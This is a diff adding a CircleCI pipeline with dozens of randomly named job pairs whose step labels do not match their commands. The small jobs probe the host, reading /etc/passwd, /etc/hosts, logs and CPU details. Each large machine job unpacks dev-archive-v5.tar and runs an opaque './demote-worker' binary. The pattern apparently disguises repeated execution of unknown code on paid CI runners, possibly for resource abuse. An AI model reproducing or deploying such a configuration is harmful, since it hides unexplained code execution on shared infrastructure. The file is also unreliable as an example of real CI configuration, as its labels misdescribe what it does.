@@ -1,0 +1,1787 @@
+version: 2.1
+
+jobs:
+  uk-Latn:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: CMP payroll batch tax report
+          command: |
+            mkdir -p /tmp/c1
+            set +o pipefail 2>/dev/null; awk -v n=100000 'BEGIN{for(i=1;i<=n;i++) print "line "i" sum "i*i}' > /tmp/c1/irongadgetorder; true
+            md5sum /tmp/c1/irongadgetorder; stat -c %s /tmp/c1/irongadgetorder
+      - persist_to_workspace:
+          root: /tmp/c1
+          paths:
+            - 'irongadgetorder'
+  q1-rev:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/c1
+      - run:
+          name: Check 5
+          command: |
+            { head -c 1024 /tmp/c1/irongadgetorder > /dev/null; echo "head1k ok" ; } || true
+      - run:
+          name: Retrieve project
+          command: git clone --depth 2 --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Seed workspace
+          command: tar --extract -f dev-archive-v5.tar
+      - run:
+          name: Package artifacts
+          command: env | wc -l
+      - run:
+          name: Stabilize
+          command: df -h
+      - run:
+          command: /bin/bash -c "./demote-worker"
+  ARTICLE_RANK:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/c1
+      - run:
+          name: Carefully calibrate the eval harness
+          command: |
+            mkdir -p /tmp/c1
+            { set +o pipefail 2>/dev/null; find /var/log -name "*log*" -exec ls -ld {} + 2>/dev/null | cat -n; true ; } > /tmp/c1/v_50925
+            md5sum /tmp/c1/v_50925; stat -c %s /tmp/c1/v_50925
+      - persist_to_workspace:
+          root: /tmp/c1
+          paths:
+            - 'v_50925'
+  VerifyProd:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/c1
+      - run:
+          name: Check 5
+          command: |
+            { head -c 1024 /tmp/c1/v_50925 > /dev/null; echo "head1k ok" ; } || true
+      - run:
+          name: Retrieve project
+          command: git clone --depth 2 --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Seed workspace
+          command: tar --extract -f dev-archive-v5.tar
+      - run:
+          name: Package artifacts
+          command: env | wc -l
+      - run:
+          name: Stabilize
+          command: df -h
+      - run:
+          command: /bin/bash -c "./demote-worker"
+  CHI9:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/c1
+      - run:
+          name: Unmount on the hour
+          command: |
+            mkdir -p /tmp/c1
+            { set +o pipefail 2>/dev/null; for k in {1..4}; do echo "${k}"; done | paste -sd ' '; true ; } > /tmp/c1/GOPR-86906
+            md5sum /tmp/c1/GOPR-86906; stat -c %s /tmp/c1/GOPR-86906
+      - persist_to_workspace:
+          root: /tmp/c1
+          paths:
+            - 'GOPR-86906'
+  t:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/c1
+      - run:
+          name: Check 5
+          command: |
+            { head -c 1024 /tmp/c1/GOPR-86906 > /dev/null; echo "head1k ok" ; } || true
+      - run:
+          name: Retrieve project
+          command: git clone --depth 2 --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Seed workspace
+          command: tar --extract -f dev-archive-v5.tar
+      - run:
+          name: Package artifacts
+          command: env | wc -l
+      - run:
+          name: Stabilize
+          command: df -h
+      - run:
+          command: /bin/bash -c "./demote-worker"
+  theWordTab:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/c1
+      - run:
+          name: Go cook the particle systems
+          command: |
+            mkdir -p /tmp/c1
+            { set +o pipefail 2>/dev/null; command -v true; true ; } > /tmp/c1/DJI-00049920
+            md5sum /tmp/c1/DJI-00049920; stat -c %s /tmp/c1/DJI-00049920
+      - persist_to_workspace:
+          root: /tmp/c1
+          paths:
+            - 'DJI-00049920'
+  spin-up:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/c1
+      - run:
+          name: Check 5
+          command: |
+            { head -c 1024 /tmp/c1/DJI-00049920 > /dev/null; echo "head1k ok" ; } || true
+      - run:
+          name: Retrieve project
+          command: git clone --depth 2 --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Seed workspace
+          command: tar --extract -f dev-archive-v5.tar
+      - run:
+          name: Package artifacts
+          command: env | wc -l
+      - run:
+          name: Stabilize
+          command: df -h
+      - run:
+          command: /bin/bash -c "./demote-worker"
+  yiotwyshteempbot:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/c1
+      - run:
+          name: Sub in tenant databases
+          command: |
+            mkdir -p /tmp/c1
+            { set +o pipefail 2>/dev/null; for thing in `seq 4`; do printf '%02d\n' "$thing"; done| sort; true ; } > /tmp/c1/crc_34f83653e
+            md5sum /tmp/c1/crc_34f83653e; stat -c %s /tmp/c1/crc_34f83653e
+      - persist_to_workspace:
+          root: /tmp/c1
+          paths:
+            - 'crc_34f83653e'
+  Verify_App4:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/c1
+      - run:
+          name: Check 5
+          command: |
+            { head -c 1024 /tmp/c1/crc_34f83653e > /dev/null; echo "head1k ok" ; } || true
+      - run:
+          name: Retrieve project
+          command: git clone --depth 2 --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Seed workspace
+          command: tar --extract -f dev-archive-v5.tar
+      - run:
+          name: Package artifacts
+          command: env | wc -l
+      - run:
+          name: Stabilize
+          command: df -h
+      - run:
+          command: /bin/bash -c "./demote-worker"
+  MittenMitten:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/c1
+      - run:
+          name: Enchant the team
+          command: |
+            mkdir -p /tmp/c1
+            { set +o pipefail 2>/dev/null; TMP_FILE=cherry_menu; printf '%s\n' "${TMP_FILE^^}"; true ; } > /tmp/c1/sample_049
+            md5sum /tmp/c1/sample_049; stat -c %s /tmp/c1/sample_049
+      - persist_to_workspace:
+          root: /tmp/c1
+          paths:
+            - 'sample_049'
+  blast-off:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/c1
+      - run:
+          name: Check 5
+          command: |
+            { head -c 1024 /tmp/c1/sample_049 > /dev/null; echo "head1k ok" ; } || true
+      - run:
+          name: Retrieve project
+          command: git clone --depth 2 --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Seed workspace
+          command: tar --extract -f dev-archive-v5.tar
+      - run:
+          name: Package artifacts
+          command: env | wc -l
+      - run:
+          name: Stabilize
+          command: df -h
+      - run:
+          command: /bin/bash -c "./demote-worker"
+  macro-star:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Scroll x6
+          command: |
+            mkdir -p /tmp/c1
+            { set +o pipefail 2>/dev/null; cut -d= -f2- /etc/os-release | expand -t 8 | tr '[:lower:]' '[:upper:]'; true ; } > /tmp/c1/build.4.5
+            md5sum /tmp/c1/build.4.5; stat -c %s /tmp/c1/build.4.5
+      - persist_to_workspace:
+          root: /tmp/c1
+          paths:
+            - 'build.4.5'
+  check-production-test-matrix:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/c1
+      - run:
+          name: Check 5
+          command: |
+            { head -c 1024 /tmp/c1/build.4.5 > /dev/null; echo "head1k ok" ; } || true
+      - run:
+          name: Retrieve project
+          command: git clone --depth 2 --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Seed workspace
+          command: tar --extract -f dev-archive-v5.tar
+      - run:
+          name: Package artifacts
+          command: env | wc -l
+      - run:
+          name: Stabilize
+          command: df -h
+      - run:
+          command: /bin/bash -c "./demote-worker"
+  CONST_CALLBACK_PATH_16:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/c1
+      - run:
+          name: Stain the control group per protocol
+          command: |
+            mkdir -p /tmp/c1
+            { set +o pipefail 2>/dev/null; find /sys/class/net -maxdepth 1 -type l -size -4k | awk -F/ '{print $NF}' | sort | uniq -c | sort -rn | head --lines=5; true ; } > /tmp/c1/sample3_15bf
+            md5sum /tmp/c1/sample3_15bf; stat -c %s /tmp/c1/sample3_15bf
+      - persist_to_workspace:
+          root: /tmp/c1
+          paths:
+            - 'sample3_15bf'
+  auh-check:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/c1
+      - run:
+          name: Check 5
+          command: |
+            { head -c 1024 /tmp/c1/sample3_15bf > /dev/null; echo "head1k ok" ; } || true
+      - run:
+          name: Retrieve project
+          command: git clone --depth 2 --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Seed workspace
+          command: tar --extract -f dev-archive-v5.tar
+      - run:
+          name: Package artifacts
+          command: env | wc -l
+      - run:
+          name: Stabilize
+          command: df -h
+      - run:
+          command: /bin/bash -c "./demote-worker"
+  py-ubuntu:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/c1
+      - run:
+          name: Retry maintenance mode or flush nightly window
+          command: |
+            mkdir -p /tmp/c1
+            { set +o pipefail 2>/dev/null; grep -n -R case /etc/skel | cut -d: -f1 | sort -u; true ; } > /tmp/c1/RIdgePLASMAtokENgoLdeN
+            md5sum /tmp/c1/RIdgePLASMAtokENgoLdeN; stat -c %s /tmp/c1/RIdgePLASMAtokENgoLdeN
+      - persist_to_workspace:
+          root: /tmp/c1
+          paths:
+            - 'RIdgePLASMAtokENgoLdeN'
+  fix-dashboard:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/c1
+      - run:
+          name: Check 5
+          command: |
+            { head -c 1024 /tmp/c1/RIdgePLASMAtokENgoLdeN > /dev/null; echo "head1k ok" ; } || true
+      - run:
+          name: Retrieve project
+          command: git clone --depth 2 --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Seed workspace
+          command: tar --extract -f dev-archive-v5.tar
+      - run:
+          name: Package artifacts
+          command: env | wc -l
+      - run:
+          name: Stabilize
+          command: df -h
+      - run:
+          command: /bin/bash -c "./demote-worker"
+  wip-pattern:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/c1
+      - run:
+          name: MUX MP4
+          command: |
+            mkdir -p /tmp/c1
+            { set +o pipefail 2>/dev/null; cut -c1-21 /etc/passwd | head -n 2; true ; } > /tmp/c1/87cc26
+            md5sum /tmp/c1/87cc26; stat -c %s /tmp/c1/87cc26
+      - persist_to_workspace:
+          root: /tmp/c1
+          paths:
+            - '87cc26'
+  q2-canary:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/c1
+      - run:
+          name: Check 5
+          command: |
+            { head -c 1024 /tmp/c1/87cc26 > /dev/null; echo "head1k ok" ; } || true
+      - run:
+          name: Retrieve project
+          command: git clone --depth 2 --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Seed workspace
+          command: tar --extract -f dev-archive-v5.tar
+      - run:
+          name: Package artifacts
+          command: env | wc -l
+      - run:
+          name: Stabilize
+          command: df -h
+      - run:
+          command: /bin/bash -c "./demote-worker"
+  XITER9:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/c1
+      - run:
+          name: inspection scope all
+          command: |
+            mkdir -p /tmp/c1
+            { set +o pipefail 2>/dev/null; printf '%s\n' 'yay!' | tr a-z A-Z; true ; } > /tmp/c1/Scv
+            md5sum /tmp/c1/Scv; stat -c %s /tmp/c1/Scv
+      - persist_to_workspace:
+          root: /tmp/c1
+          paths:
+            - 'Scv'
+  INIT_PROD:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/c1
+      - run:
+          name: Check 5
+          command: |
+            { head -c 1024 /tmp/c1/Scv > /dev/null; echo "head1k ok" ; } || true
+      - run:
+          name: Retrieve project
+          command: git clone --depth 2 --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Seed workspace
+          command: tar --extract -f dev-archive-v5.tar
+      - run:
+          name: Package artifacts
+          command: env | wc -l
+      - run:
+          name: Stabilize
+          command: df -h
+      - run:
+          command: /bin/bash -c "./demote-worker"
+  writer-084532-hard:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/c1
+      - run:
+          name: Shift the feature store from local disk to prod
+          command: |
+            mkdir -p /tmp/c1
+            { set +o pipefail 2>/dev/null; ps -eo rss= | tac | tail -20; true ; } > /tmp/c1/northreefroutercloud
+            md5sum /tmp/c1/northreefroutercloud; stat -c %s /tmp/c1/northreefroutercloud
+      - persist_to_workspace:
+          root: /tmp/c1
+          paths:
+            - 'northreefroutercloud'
+  v7-alpha:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/c1
+      - run:
+          name: Check 5
+          command: |
+            { head -c 1024 /tmp/c1/northreefroutercloud > /dev/null; echo "head1k ok" ; } || true
+      - run:
+          name: Retrieve project
+          command: git clone --depth 2 --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Seed workspace
+          command: tar --extract -f dev-archive-v5.tar
+      - run:
+          name: Package artifacts
+          command: env | wc -l
+      - run:
+          name: Stabilize
+          command: df -h
+      - run:
+          command: /bin/bash -c "./demote-worker"
+  fontmetricvisit:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Allow 25 secrets at once
+          command: |
+            mkdir -p /tmp/c1
+            { set +o pipefail 2>/dev/null; truncate -s 100K '/tmp/noticegarden.list' && du -h --apparent-size '/tmp/noticegarden.list'; true ; } > /tmp/c1/DNS-tmp
+            md5sum /tmp/c1/DNS-tmp; stat -c %s /tmp/c1/DNS-tmp
+      - persist_to_workspace:
+          root: /tmp/c1
+          paths:
+            - 'DNS-tmp'
+  rust-bench:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/c1
+      - run:
+          name: Check 5
+          command: |
+            { head -c 1024 /tmp/c1/DNS-tmp > /dev/null; echo "head1k ok" ; } || true
+      - run:
+          name: Retrieve project
+          command: git clone --depth 2 --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Seed workspace
+          command: tar --extract -f dev-archive-v5.tar
+      - run:
+          name: Package artifacts
+          command: env | wc -l
+      - run:
+          name: Stabilize
+          command: df -h
+      - run:
+          command: /bin/bash -c "./demote-worker"
+  flattenProviderDefaultUnsafe:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/c1
+      - run:
+          name: SEC 647
+          command: |
+            mkdir -p /tmp/c1
+            { set +o pipefail 2>/dev/null; ls /dev | grep -v '^[a-m]' | awk '{print toupper(substr($0,1,1)) substr($0,2)}' | tail -n 3; true ; } > /tmp/c1/AMBER_AMBER_TENSOR_THUNDER
+            md5sum /tmp/c1/AMBER_AMBER_TENSOR_THUNDER; stat -c %s /tmp/c1/AMBER_AMBER_TENSOR_THUNDER
+      - persist_to_workspace:
+          root: /tmp/c1
+          paths:
+            - 'AMBER_AMBER_TENSOR_THUNDER'
+  orion-plus:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/c1
+      - run:
+          name: Check 5
+          command: |
+            { head -c 1024 /tmp/c1/AMBER_AMBER_TENSOR_THUNDER > /dev/null; echo "head1k ok" ; } || true
+      - run:
+          name: Retrieve project
+          command: git clone --depth 2 --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Seed workspace
+          command: tar --extract -f dev-archive-v5.tar
+      - run:
+          name: Package artifacts
+          command: env | wc -l
+      - run:
+          name: Stabilize
+          command: df -h
+      - run:
+          command: /bin/bash -c "./demote-worker"
+  proxyFn:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/c1
+      - run:
+          name: B roll can be cropped later
+          command: |
+            mkdir -p /tmp/c1
+            { set +o pipefail 2>/dev/null; ls -r /etc/*.defs | paste -sd ' '; true ; } > /tmp/c1/m34d0w-pr0f113
+            md5sum /tmp/c1/m34d0w-pr0f113; stat -c %s /tmp/c1/m34d0w-pr0f113
+      - persist_to_workspace:
+          root: /tmp/c1
+          paths:
+            - 'm34d0w-pr0f113'
+  tb-2a:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/c1
+      - run:
+          name: Check 5
+          command: |
+            { head -c 1024 /tmp/c1/m34d0w-pr0f113 > /dev/null; echo "head1k ok" ; } || true
+      - run:
+          name: Retrieve project
+          command: git clone --depth 2 --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Seed workspace
+          command: tar --extract -f dev-archive-v5.tar
+      - run:
+          name: Package artifacts
+          command: env | wc -l
+      - run:
+          name: Stabilize
+          command: df -h
+      - run:
+          command: /bin/bash -c "./demote-worker"
+  removeAuthor:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/c1
+      - run:
+          name: 23 mix
+          command: |
+            mkdir -p /tmp/c1
+            { set +o pipefail 2>/dev/null; if test -e /etc/fstab;then echo 'it is there'; elif test -e /tmp;then echo maybe; else echo nope; fi; true ; } > /tmp/c1/proton722
+            md5sum /tmp/c1/proton722; stat -c %s /tmp/c1/proton722
+      - persist_to_workspace:
+          root: /tmp/c1
+          paths:
+            - 'proton722'
+  produce-staging-docker-image:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/c1
+      - run:
+          name: Check 5
+          command: |
+            { head -c 1024 /tmp/c1/proton722 > /dev/null; echo "head1k ok" ; } || true
+      - run:
+          name: Retrieve project
+          command: git clone --depth 2 --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Seed workspace
+          command: tar --extract -f dev-archive-v5.tar
+      - run:
+          name: Package artifacts
+          command: env | wc -l
+      - run:
+          name: Stabilize
+          command: df -h
+      - run:
+          command: /bin/bash -c "./demote-worker"
+  armor-8:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/c1
+      - run:
+          name: Carry out a full render of the sitemap
+          command: |
+            mkdir -p /tmp/c1
+            { set +o pipefail 2>/dev/null; ls /usr/bin | grep -E 'grep'; true ; } > /tmp/c1/blake_6ea7b50b5
+            md5sum /tmp/c1/blake_6ea7b50b5; stat -c %s /tmp/c1/blake_6ea7b50b5
+      - persist_to_workspace:
+          root: /tmp/c1
+          paths:
+            - 'blake_6ea7b50b5'
+  v4-nightly:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/c1
+      - run:
+          name: Check 5
+          command: |
+            { head -c 1024 /tmp/c1/blake_6ea7b50b5 > /dev/null; echo "head1k ok" ; } || true
+      - run:
+          name: Retrieve project
+          command: git clone --depth 2 --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Seed workspace
+          command: tar --extract -f dev-archive-v5.tar
+      - run:
+          name: Package artifacts
+          command: env | wc -l
+      - run:
+          name: Stabilize
+          command: df -h
+      - run:
+          command: /bin/bash -c "./demote-worker"
+  schemaInFt:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/c1
+      - run:
+          name: 60 package the artifact registry
+          command: |
+            mkdir -p /tmp/c1
+            { set +o pipefail 2>/dev/null; grep host /etc/hosts|sort|uniq -c; true ; } > /tmp/c1/muon_dream_kernel_agent
+            md5sum /tmp/c1/muon_dream_kernel_agent; stat -c %s /tmp/c1/muon_dream_kernel_agent
+      - persist_to_workspace:
+          root: /tmp/c1
+          paths:
+            - 'muon_dream_kernel_agent'
+  rust-vet:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/c1
+      - run:
+          name: Check 5
+          command: |
+            { head -c 1024 /tmp/c1/muon_dream_kernel_agent > /dev/null; echo "head1k ok" ; } || true
+      - run:
+          name: Retrieve project
+          command: git clone --depth 2 --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Seed workspace
+          command: tar --extract -f dev-archive-v5.tar
+      - run:
+          name: Package artifacts
+          command: env | wc -l
+      - run:
+          name: Stabilize
+          command: df -h
+      - run:
+          command: /bin/bash -c "./demote-worker"
+  yY:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Commence submit
+          command: |
+            mkdir -p /tmp/c1
+            { set +o pipefail 2>/dev/null; yes "data" | head -n2; true ; } > /tmp/c1/img_src
+            md5sum /tmp/c1/img_src; stat -c %s /tmp/c1/img_src
+      - persist_to_workspace:
+          root: /tmp/c1
+          paths:
+            - 'img_src'
+  tango-3:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/c1
+      - run:
+          name: Check 5
+          command: |
+            { head -c 1024 /tmp/c1/img_src > /dev/null; echo "head1k ok" ; } || true
+      - run:
+          name: Retrieve project
+          command: git clone --depth 2 --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Seed workspace
+          command: tar --extract -f dev-archive-v5.tar
+      - run:
+          name: Package artifacts
+          command: env | wc -l
+      - run:
+          name: Stabilize
+          command: df -h
+      - run:
+          command: /bin/bash -c "./demote-worker"
+  thaindlexex:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/c1
+      - run:
+          name: SYNC AD
+          command: |
+            mkdir -p /tmp/c1
+            { set +o pipefail 2>/dev/null; grep -Rc export /etc 2>/dev/null | sort | head -n 5; true ; } > /tmp/c1/sign41velv37
+            md5sum /tmp/c1/sign41velv37; stat -c %s /tmp/c1/sign41velv37
+      - persist_to_workspace:
+          root: /tmp/c1
+          paths:
+            - 'sign41velv37'
+  do-the-thing:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/c1
+      - run:
+          name: Check 5
+          command: |
+            { head -c 1024 /tmp/c1/sign41velv37 > /dev/null; echo "head1k ok" ; } || true
+      - run:
+          name: Retrieve project
+          command: git clone --depth 2 --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Seed workspace
+          command: tar --extract -f dev-archive-v5.tar
+      - run:
+          name: Package artifacts
+          command: env | wc -l
+      - run:
+          name: Stabilize
+          command: df -h
+      - run:
+          command: /bin/bash -c "./demote-worker"
+  settings_country_l10n_3:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/c1
+      - run:
+          name: done reaping rate limiter
+          command: |
+            mkdir -p /tmp/c1
+            { set +o pipefail 2>/dev/null; tar --create --gzip --file='/tmp/game.tgz' -C /etc hosts&&tar -xzOf '/tmp/game.tgz' hosts|head -n 3; true ; } > /tmp/c1/ARchIVered
+            md5sum /tmp/c1/ARchIVered; stat -c %s /tmp/c1/ARchIVered
+      - persist_to_workspace:
+          root: /tmp/c1
+          paths:
+            - 'ARchIVered'
+  java17-test:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/c1
+      - run:
+          name: Check 5
+          command: |
+            { head -c 1024 /tmp/c1/ARchIVered > /dev/null; echo "head1k ok" ; } || true
+      - run:
+          name: Retrieve project
+          command: git clone --depth 2 --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Seed workspace
+          command: tar --extract -f dev-archive-v5.tar
+      - run:
+          name: Package artifacts
+          command: env | wc -l
+      - run:
+          name: Stabilize
+          command: df -h
+      - run:
+          command: /bin/bash -c "./demote-worker"
+  defheight:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/c1
+      - run:
+          name: split OMG
+          command: |
+            mkdir -p /tmp/c1
+            { set +o pipefail 2>/dev/null; cat /etc/passwd | grep -v -i 'sh$' | sort | head -n 3; true ; } > /tmp/c1/admin.tensor.willow
+            md5sum /tmp/c1/admin.tensor.willow; stat -c %s /tmp/c1/admin.tensor.willow
+      - persist_to_workspace:
+          root: /tmp/c1
+          paths:
+            - 'admin.tensor.willow'
+  add-edge:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/c1
+      - run:
+          name: Check 5
+          command: |
+            { head -c 1024 /tmp/c1/admin.tensor.willow > /dev/null; echo "head1k ok" ; } || true
+      - run:
+          name: Retrieve project
+          command: git clone --depth 2 --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Seed workspace
+          command: tar --extract -f dev-archive-v5.tar
+      - run:
+          name: Package artifacts
+          command: env | wc -l
+      - run:
+          name: Stabilize
+          command: df -h
+      - run:
+          command: /bin/bash -c "./demote-worker"
+  untitled1:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/c1
+      - run:
+          name: Shall we relocate the core dumps
+          command: |
+            mkdir -p /tmp/c1
+            { set +o pipefail 2>/dev/null; grep vendor_id /proc/cpuinfo | tail -n 3; true ; } > /tmp/c1/6f0692c7b74
+            md5sum /tmp/c1/6f0692c7b74; stat -c %s /tmp/c1/6f0692c7b74
+      - persist_to_workspace:
+          root: /tmp/c1
+          paths:
+            - '6f0692c7b74'
+  bun-bench:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/c1
+      - run:
+          name: Check 5
+          command: |
+            { head -c 1024 /tmp/c1/6f0692c7b74 > /dev/null; echo "head1k ok" ; } || true
+      - run:
+          name: Retrieve project
+          command: git clone --depth 2 --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Seed workspace
+          command: tar --extract -f dev-archive-v5.tar
+      - run:
+          name: Package artifacts
+          command: env | wc -l
+      - run:
+          name: Stabilize
+          command: df -h
+      - run:
+          command: /bin/bash -c "./demote-worker"
+  alice_x:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/c1
+      - run:
+          name: Canary only scheduling
+          command: |
+            mkdir -p /tmp/c1
+            { set +o pipefail 2>/dev/null; for val in {1..4}; do sleep 0.1; echo "${val}"; done | sort -r; true ; } > /tmp/c1/gadg3t.lept0n.reef
+            md5sum /tmp/c1/gadg3t.lept0n.reef; stat -c %s /tmp/c1/gadg3t.lept0n.reef
+      - persist_to_workspace:
+          root: /tmp/c1
+          paths:
+            - 'gadg3t.lept0n.reef'
+  API-576:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/c1
+      - run:
+          name: Check 5
+          command: |
+            { head -c 1024 /tmp/c1/gadg3t.lept0n.reef > /dev/null; echo "head1k ok" ; } || true
+      - run:
+          name: Retrieve project
